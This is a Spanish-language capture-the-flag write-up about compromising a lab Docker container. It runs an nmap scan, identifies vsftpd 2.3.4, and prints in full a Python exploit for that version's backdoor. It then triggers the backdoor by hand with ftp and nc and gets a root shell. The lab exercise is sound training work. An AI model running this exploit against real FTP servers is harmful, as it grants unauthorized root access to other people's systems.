## LEVANTAMOS EL DOCKER 

Una vez levantado el docker nos dice que la ip de la máquina victima es :
```bash
172.17.0.2
```
comprobamos si tenemos trazabilidad con la misma lanzando un ping

```bash
 ping -c 1 172.17.0.2
```
```
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.034 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.034/0.034/0.034/0.000 ms
```

Nos dice que se ha transmitido un paquete, recibido uno y perdido cero, tenemos trazabilidad

## FASE DE RECONOCIMIENTO
 Con nmap vamos a ver los puertos que tiene abiertos, los servicios que corren en los mismos y la versión para ver si hay alguna vulnerabilidad

 ```bash
 sudo nmap -sS -sCV -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN PuertosYservicios
```
```
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 vsftpd 2.3.4
|_ftp-anon: got code 500 "OOPS: cannot change directory:/var/ftp".
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
```
Vemos un puerto 21 que corre ftp con su versión "vsftpd 2.3.4", al ver que se ha lanzado el script ftp-anom y
su respuesta  got code 500 "OOPS: cannot change directory:/var/ftp" me hace sospechar que esta versión puede ser vulnerable.


##FASE INTRUSIÓN

Hago una busqueda rápida y encuentro este exploit para esa version:
```bash
https://github.com/Hellsender01/vsftpd_2.3.4_Exploit/blob/main/exploit.py
```
```bash
#!/usr/bin/python3

from pwn import *
from sys import exit
from time import sleep

class ExploitFTP:
	def __init__(self,ip,port=21):
		self.ip = ip
		self.port = port
		self.p = log.progress("")

	def trigger_backdoor(self):
		self.p.status("Checking Version...")
		io = remote(self.ip,self.port)
		io.recvuntil(b"vsFTPd ")
		version = (io.recvuntil(b")")[:-1]).decode()
		if version != "2.3.4":
			self.p.failure("Version 2.3.4 Not Found!!!")
			exit()
		else:
			self.p.status("Triggering Backdoor....")
			io.sendline(b"USER hello:)")
			io.sendline(b"PASS hello123")
			io.close()

	def get_shell(self):
		self.p.status("Connecting To Backdoor...")
		sleep(1)
		io = remote(self.ip, 6200)
		self.p.success("Got Shell!!!")
		io.interactive()
		io.close()

if __name__ == "__main__":
	if len(sys.argv) < 2 or len(sys.argv) > 3:
		error(f"Usage: {sys.argv[0]} IP PORT(optional)")

	if len(sys.argv) == 3:
		exploit = ExploitFTP(sys.argv[1],sys.argv[2])
	else:
		exploit = ExploitFTP(sys.argv[1])

	exploit.trigger_backdoor()
	exploit.get_shell()
```

vamos a explicar un poco lo que hace

En esta parte:
```
else:
    self.p.status("Triggering Backdoor....")
    io.sendline(b"USER hello:)")
    io.sendline(b"PASS hello123")
    io.close()
```

Envia un usuario malicioso: "hello:)" y un pass: "hello123" y en teoría abre un backdoor

y en esta parte:

```
def get_shell(self):
    self.p.status("Connecting To Backdoor...")
    sleep(1)
    io = remote(self.ip, 6200)  # Se conecta al puerto 6200
    self.p.success("Got Shell!!!")
    io.interactive()
    io.close()
```
 Se conecta al puerto 6200 que es dónde ha abierto la backdoor, vamos a hacerlo de forma manual

 nos conectamos por ftp:
 ```bash
ftp 172.17.0.2
```
introducimos el user:
```bash
hello:)
```
y luego el pass
```bash
hola123
```
En teoria nos ha tenido que abrir la backdoor en el puerto 6200 y nos vamos a intentar conectar con nc
```bash
 nc 172.17.0.2 6200
```
 probamos si la conexión tiene exito:
 ```bash
id
```
```
uid=0(root) gid=0(root) groups=0(root)
```
y estamos dentro como root una máquina sencilla que nos recuerda que hay que mirar siempre las vulnerabilidades de las versions




